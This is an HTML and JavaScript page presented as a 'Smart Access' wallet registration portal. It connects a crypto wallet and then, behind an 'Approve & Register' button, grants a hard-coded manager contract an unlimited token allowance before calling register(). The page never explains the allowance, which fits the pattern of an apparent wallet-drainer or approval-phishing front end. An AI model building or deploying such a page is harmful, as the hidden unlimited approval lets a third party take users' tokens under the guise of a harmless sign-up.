<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smart Access Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.1/dist/index.umd.min.js"></script>

    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
        .btn { padding: 16px; font-size: 18px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 15px; }
        #connectBtn { background: #2196F3; color: white; }
        #registerBtn { background: #4CAF50; color: white; display: none; }
        #dashboard { display: none; }
        .status { font-size: 12px; color: #666; margin-top: 15px; word-break: break-all; }
    </style>
</head>
<body>

<div class="card">
    <div id="loginView">
        <h2>Smart Access</h2>
        <p style="color: #666; font-size: 14px;">Wallet connect karke register karein</p>
        <button id="connectBtn" onclick="connect()">Connect Wallet</button>
    </div>

    <div id="dashboard">
        <h2 style="color: #2196F3;">Dashboard</h2>
        <p id="addr" class="status" style="background: #eee; padding: 10px; border-radius: 8px;"></p>
        <button id="registerBtn" class="btn" onclick="register()">Approve & Register</button>
        <p onclick="location.reload()" style="color: red; cursor: pointer; font-size: 12px; margin-top: 20px;">Logout</p>
    </div>
    
    <div id="msg" class="status"></div>
</div>

<script>
    // Configuration
    const PROJECT_ID = 'c2f4246144b7fd8bc63f9e89966cc29b'; // Aapka Project ID
    const MANAGER = "0x43c7df8DB3503c4839C9249E7D0C520E801C9dBA";
    const TOKEN = "0x3B66b1E08F55AF26c8eA14a73dA64b6bC8D799dE";
    
    let provider, signer, address;

    async function connect() {
        const msg = document.getElementById('msg');
        msg.innerText = "Connecting...";

        try {
            // 1. Check if already in DApp Browser (MetaMask/Trust)
            if (window.ethereum) {
                const ethersProvider = new ethers.providers.Web3Provider(window.ethereum);
                await ethersProvider.send("eth_requestAccounts", []);
                setupUI(ethersProvider);
            } 
            // 2. Mobile Browser (Chrome/Safari) ke liye WalletConnect
            else {
                const wcProvider = await EthereumProvider.EthereumProvider.init({
                    projectId: PROJECT_ID,
                    showQrModal: true,
                    qrModalOptions: { themeMode: "light" },
                    chains: [97], // BSC Testnet (Use 56 for Mainnet)
                    methods: ["eth_sendTransaction", "personal_sign"],
                    events: ["chainChanged", "accountsChanged"]
                });

                await wcProvider.connect();
                const ethersProvider = new ethers.providers.Web3Provider(wcProvider);
                setupUI(ethersProvider);
            }
        } catch (err) {
            console.error(err);
            msg.innerText = "Connection Failed: " + err.message;
        }
    }

    async function setupUI(ethersProvider) {
        signer = ethersProvider.getSigner();
        address = await signer.getAddress();

        document.getElementById('loginView').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        document.getElementById('registerBtn').style.display = 'block';
        document.getElementById('addr').innerText = "Wallet: " + address;
        document.getElementById('msg').innerText = "Connected âœ…";
    }

    async function register() {
        const btn = document.getElementById('registerBtn');
        const msg = document.getElementById('msg');
        try {
            btn.disabled = true;
            btn.innerText = "Wait...";
            
            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);

            msg.innerText = "Step 1: Approving Token...";
            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256);
            await tx1.wait();

            msg.innerText = "Step 2: Registering...";
            const tx2 = await mCon.register();
            await tx2.wait();

            msg.innerHTML = "<b style='color:green'>Registration Successful!</b>";
            alert("Done!");
        } catch (e) {
            alert("Failed! Check Balance.");
            btn.disabled = false;
            btn.innerText = "Approve & Register";
        }
    }
</script>
</body>
</html>
